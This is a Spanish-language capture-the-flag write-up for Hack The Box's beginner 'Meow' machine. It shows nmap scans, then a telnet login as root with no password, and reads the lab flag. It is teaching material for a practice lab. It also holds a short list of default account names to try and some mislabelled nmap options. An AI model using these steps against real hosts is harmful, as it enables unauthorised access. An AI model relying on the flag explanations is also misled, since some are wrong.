---
layout: single
title: Meow - Hack The Box
excerpt: "Meow es una máquina muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando Telnet, un protocolo de red que brinda a los usuarios una forma no segura de acceder a una computadora a través de una red."
date: 2022-10-25
classes: wide
header:
  teaser: /assets/images/htb-writeup-meow/meow-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - CTFs
  - Linux
tags:  
  - telnet
  - access with root and no password
---

![](/assets/images/htb-writeup-meow/meow-logo.png)

Meow es una máquina Linux muy fácil que forma parte del Tier 0 de las máquinas para principiantes del Starting Point de Hack The Box. Para poder completar esta máquina, tendremos que conectarnos a ella a través de la VPN, para posteriormente comprometer la máquina mediante técnicas de reconocimiento y escaneos para abusar de las vulnerabilidades existentes. En este caso, estaremos tocando `Telnet`, un protocolo de red antiguo que brinda a los usuarios una forma no segura de acceder a una computadora a través de una red.

## Reconocimiento Inicial

```
ping -c 1 10.129.1.17

PING 10.129.1.17 ( 10.129.1.17) 56(84) bytes of data.
64 bytes from 10.129.1.17: icmp_seq=1 ttl=63 time=44.5 ms

--- 10.129.1.17 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 44.477/44.477/44.477/0.000 ms
```

## Escaneo de Puertos

```
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.1.17 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 08:56 CEST
Initiating SYN Stealth Scan at 08:56
Scanning 10.129.1.17 [65535 ports]
Discovered open port 23/tcp on 10.129.1.17
Completed SYN Stealth Scan at 08:56, 15 .21s elapsed (65535 total ports)
Nmap scan report for 10.129.1.17
Host is up, received user-set (0.15s latency).
Scanned at 2022-08-13 CEST for 15s
Not shown: 63848 closed tcp ports (reset), 1686 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-rateltmtt
PORT STATE SERVICE REASON
23/tcp open telnet syn-ack ttl 63

Read data files from: /usr/bin/ . ./share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.39 seconds
    Raw packets sent: 76155 (3.351MB) I Rcvd: 68205 (2.728MB)
```

**Escaneo inicial de puertos abiertos con Nmap**
- **-p-** Escanea todo el rango de puertos [1-65535]
- **--open** Muestro solo los puertos abiertos
- **-sS** Aplica un TCP SYN Port Scan
- **--min-rate** Indica el número de paquetes por segundo a emitir
- **-vvv** Muestra por pantalla la información descubierta durante el escaneo
- **-n** Indica que no se aplicará resolución DNS durante el escaneo 
- **-Pn** Indica que no se aplicará el protocolo ARP durante el escaneo
- **-oG** Exporta el output del escaneo a un fichero en formato grepeable

![](/assets/images/htb-writeup-meow/allPorts.png)

```
sudo nmap -sCV -p23 10.129.1.17 -oN targeted 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 09:00 CEST Nmap scan report for 10.129.1.17 Host is up (0.051s latency).

PORT   STATE SERVICE  VERSION
23/tcp open  telnet   Linux telnetd, Service Info: OS: Linux; CPE: cpe:/o:linux:linux kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 21.49 seconds
```

**Escaneo avanzado de detección de versiones y servicios con Nmap**
- **-p** Escanea los puertos especificados
- **-sV** Activa la detección de versiones y servicios
- **-sC** Lanza scripts básicos de reconocimiento y enumeración
- **-oG** Exporta el output del escaneo a un fichero en formato normal

![](/assets/images/htb-writeup-meow/targeted.png)

## Detección de vulnerabilidades

Como podemos ver en el escaneo, hemos identificado que el puerto `23/tcp` está
en estado abierto, ejecutando el servicio de telnet. `Telnet` es un protocolo de red
que brinda a los usuarios una forma no segura de acceder a una computadora
a través de una red. A veces, debido a errores de configuración, `algunas cuentas importantes pueden
quedar con contraseñas en blanco` en áreas de la accesibilidad, como la vulnerabilidad `Telnet Access with Root and No Password`. Este es un problema importante para algunos dispositivos de red o hosts, dejándolos abiertos
a ataques simples de fuerza bruta, donde el atacante puede intentar iniciar sesión secuencialmente, utilizando una lista de nombres de usuario sin entrada de
contraseña. 

**Algunas típicas cuentas importantes que hay que tener en cuenta son:**
- admin
- administrator
- root

## Explotación de vulnerabilidades

**Telnet**

```
telnet 10.129.1.17

Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.


Meow login:
```

Procedemos a conectarnos a `telnet` a través de la ip de la máquina víctima para
posteriormente acceder al servicio desde una cuenta sin contraseña probando
manualmente o con un diccionario y fuerza bruta. En este caso, probando distinas contraseñas manualmente, veremos que la cuenta `root` no nos pide contraseña para conectarnos.

```
telnet 10.129.1.17

Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.
Hack the fox


Meow login: root


Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage

  System information as of Sat 13 Aug 2022 07:05:37 AM UTC
  
  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             139
  Users logged in:       0
  IPv4 address for etho: 10.129.1.17
  IPv6 address for etho: dead:beef::250:56ff:fe96:bc97

  * Super-optimized for small spaces - read how we shrank the memory
    footprint of Microkes to make it the smallest full K8s around.

    https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
```

Una vez iniciada la sesión en el sistema destino, tendremos acceso a la `flag.txt`.

```
Last login: Sat Aug 13 07:04:40 UTC 2022 on pts/0

root@Meow:~# ls
flag.txt snap

root@Meow:r# cat flag.txt
b40abdfe23665f766f9c61ecba8a4c19
```